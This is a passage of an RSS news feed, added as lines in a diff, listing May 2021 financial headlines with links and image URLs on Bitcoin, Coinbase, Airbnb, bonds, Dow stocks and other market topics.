+<link>https://www.barrons.com/articles/bitcoin-stock-market-51621643806?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-22T00:50:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">bitcoin-stock-market-51621643806?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/xXcGjiQSQA_XDEqMkZCtjg--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/5ae0c4d88bb5a9355ed91817c4d2ad09" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Airbnb Stock: Is It A Buy? Here's What Fundamentals, ABNB Stock Chart Action Say</title>
+<link>https://www.investors.com/research/airbnb-abnb-stock-buy-now/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-21T17:01:29Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/wdAzur82dp9gTF1NRNhE0Q--~B/aD01Mzg7dz05NzU7YXBwaWQ9eXRhY2h5b24-/https://media.zenfs.com/en/ibd.com/3bdbac35cf1764797913b12ff37137eb" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Is Coinbase Stock A Buy Right Now As Bitcoin Plunges Again?</title>
+<link>https://www.investors.com/research/coinbase-coin-stock-buy-now/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-21T20:02:40Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/3Nt0msOhbsoih0AZEEsK5A--~B/aD01NjM7dz0xMDAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/ec50a0b66e3ed1855638b17b8ba81d7b" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Bonds are hated — here’s when they may become attractive again</title>
+<link>https://www.marketwatch.com/story/bonds-are-hated-heres-when-they-may-become-attractive-again-11621598885?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T12:08:00Z</pubDate>
+<source url="http://www.marketwatch.com/">MarketWatch</source>
+<guid isPermaLink="false">bonds-are-hated-heres-when-they-may-become-attractive-again-11621598885?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/Z3LU8SaUAnOzM5n4ieNTCg--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/marketwatch.com/b9b0ae9349f3dc4fff26eefcd73e79cf" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>The May 19 Sell-Off Actually Strengthened Bitcoin’s Narrative</title>
+<link>https://finance.yahoo.com/news/may-19-sell-off-actually-214804884.html</link>
+<pubDate>2021-05-21T21:48:04Z</pubDate>
+<source url="https://www.coindesk.com">CoinDesk</source>
+<guid isPermaLink="false">may-19-sell-off-actually-214804884.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/f3j99vOYpNNFJg6ojehdAw--~B/aD0xNzA3O3c9MjU2MDthcHBpZD15dGFjaHlvbg--/https://media.zenfs.com/en/coindesk_75/c805bf167264d973eef52023845bcb20" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>4 Dow Jones Stocks To Buy And Watch In May 2021: Apple Sells Off, Boeing Surges</title>
+<link>https://www.investors.com/research/dow-jones-stocks/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-21T20:04:33Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/gQ_HwzhORxRfxro9gtZnTw--~B/aD01NzI7dz0xMDEyO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/56901482f55f234b59b6643da5f2851a" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Will Biden cancel $50K in student loan debt? He's sounding more skeptical</title>
+<link>https://finance.yahoo.com/news/biden-cancel-50k-student-loan-175000729.html</link>
+<pubDate>2021-05-21T17:50:00Z</pubDate>
+<source url="https://moneywise.com/">MoneyWise</source>
+<guid isPermaLink="false">biden-cancel-50k-student-loan-175000729.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/q.YXz0.Ruz0kvDYuSEVlVg--~B/aD00MDA7dz03Mjg7YXBwaWQ9eXRhY2h5b24-/https://media.zenfs.com/en/moneywise_327/0bd2663823df2cba308f5d58fb838865" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>AT&T’s new outlook sparks debate—but also two stock upgrades</title>
+<link>https://www.marketwatch.com/story/at-ts-new-outlook-sparks-debatebut-also-two-stock-upgrades-11621607377?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T14:29:00Z</pubDate>
+<source url="http://www.marketwatch.com/">MarketWatch</source>
+<guid isPermaLink="false">at-ts-new-outlook-sparks-debatebut-also-two-stock-upgrades-11621607377?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/S8SCotpO9m2XQyQUIGU5dw--~B/aD02MzA7dz0xMjAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/marketwatch.com/96d076434b2a015a3010bd2787b8c856" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Is MARA Stock A Buy As Bitcoin Slumps? Here's What Earnings, Marathon Digital Stock Chart Show</title>
+<link>https://www.investors.com/news/marathon-digital-mara-stock-buy-now/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-21T14:13:59Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/ZcubRzL3Ddu2eNsPQyYD8g--~B/aD01NjM7dz0xMDAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/a98ce4d0e87ac899116acf3765c69963" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Bitcoin Is Sliding Again as Threats of Regulation Mount</title>
+<link>https://www.barrons.com/articles/bitcoin-news-51621609828?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T19:55:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">bitcoin-news-51621609828?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/Yyep8Jf0wuF5Uy7mpXwjIA--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/4b124744439e9fbe854b684e03ce24e8" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+</channel>
+</rss>
